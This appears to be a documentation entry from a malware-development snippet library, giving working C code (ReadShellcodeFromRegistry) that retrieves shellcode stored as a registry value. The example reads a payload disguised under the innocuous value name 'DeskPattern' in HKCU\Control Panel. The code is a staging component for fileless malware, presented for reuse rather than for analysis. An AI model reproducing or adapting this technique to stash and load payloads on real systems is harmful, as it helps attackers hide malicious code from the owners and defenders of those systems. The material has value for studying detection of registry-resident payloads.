## Read From a Registry Key (Unicode)

Retrieves a payload from a registry key using two `RegGetValueW` calls — the first with a `NULL` data pointer to obtain the payload size, the second after `HeapAlloc` to read the payload into the allocated buffer. Functionally identical to the ASCII variant but uses wide-string (`W`) API calls throughout. The hive, key path, and value name are all caller-supplied.

**Usage**

Call `ReadShellcodeFromRegistry` with the root hive, the wide-string subkey path, and the wide-string value name. On success, `*ppPayload` holds the heap buffer containing the payload and `*psSize` holds its size. The caller is responsible for freeing `*ppPayload` with `HeapFree` after use.

- `IN HKEY hRootKey`  Root hive handle (e.g. `HKEY_CURRENT_USER`, `HKEY_LOCAL_MACHINE`).
- `IN LPCWSTR szRegistryPath`  Wide-string subkey path containing the value (e.g. `L"Control Panel"`).
- `IN LPCWSTR szRegValue`  Wide-string name of the binary value to read.
- `OUT PBYTE* ppPayload`  Receives the base address of the heap buffer containing the read payload.
- `OUT SIZE_T* psSize`  Receives the total size of the read payload in bytes.

**Return Value**

`BOOL`  Returns `TRUE` if the payload was successfully read from the registry, otherwise `FALSE`.

**External Files**

- `windows.h`  `BOOL`, `HKEY`, `PBYTE`, `PVOID`, `DWORD`, `SIZE_T`, `LPCWSTR`, `LSTATUS`, `IN`, `OUT`, `RegGetValueW()`, `HeapAlloc()`, `GetProcessHeap()`, `GetLastError()`
- `stdio.h`  `wprintf()`

### Code

```c
#include <windows.h>
#include <stdio.h>


BOOL ReadShellcodeFromRegistry(IN HKEY hRootKey, IN LPCWSTR szRegistryPath, IN LPCWSTR szRegValue, OUT PBYTE* ppPayload, OUT SIZE_T* psSize) {

    LSTATUS STATUS      = NULL;
    DWORD   dwBytesRead = NULL;
    PVOID   pBytes      = NULL;

    // First call: pass NULL for pvData to retrieve only the payload size.
    STATUS = RegGetValueW(
        hRootKey,           // Root hive handle supplied by the caller.
        szRegistryPath,     // Wide-string subkey path containing the value.
        szRegValue,         // Wide-string name of the value to query.
        RRF_RT_ANY,         // Accept any data type.
        NULL,               // Type output — not needed.
        NULL,               // No data buffer; retrieves size only.
        &dwBytesRead        // Receives the size of the value data in bytes.
    );
    if (ERROR_SUCCESS != STATUS) {
        wprintf(L"[!] RegGetValueW Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    // Allocate a heap buffer large enough to hold the payload.
    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
    if (pBytes == NULL) {
        wprintf(L"[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    // Second call: read the payload into the allocated buffer.
    STATUS = RegGetValueW(
        hRootKey,           // Root hive handle supplied by the caller.
        szRegistryPath,     // Wide-string subkey path containing the value.
        szRegValue,         // Wide-string name of the value to read.
        RRF_RT_ANY,         // Accept any data type.
        NULL,               // Type output — not needed.
        pBytes,             // Buffer to receive the payload data.
        &dwBytesRead        // Receives the number of bytes written to pBytes.
    );
    if (ERROR_SUCCESS != STATUS) {
        wprintf(L"[!] RegGetValueW Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    *ppPayload  = pBytes;
    *psSize     = dwBytesRead;

    return TRUE;
}
```

**Example**

```c
PBYTE  pPayload     = NULL;
SIZE_T sPayloadSize = 0;

// Read the payload previously written by WriteShellcodeToRegistry (Unicode).
if (ReadShellcodeFromRegistry(
        HKEY_CURRENT_USER,
        L"Control Panel",
        L"DeskPattern",
        &pPayload,
        &sPayloadSize
    ))
{
    wprintf(L"[+] Read %lld bytes from registry\n", (LONGLONG)sPayloadSize);
}

// Caller owns pPayload — free it via HeapFree when finished.
if (pPayload)
    HeapFree(GetProcessHeap(), 0, pPayload);
```
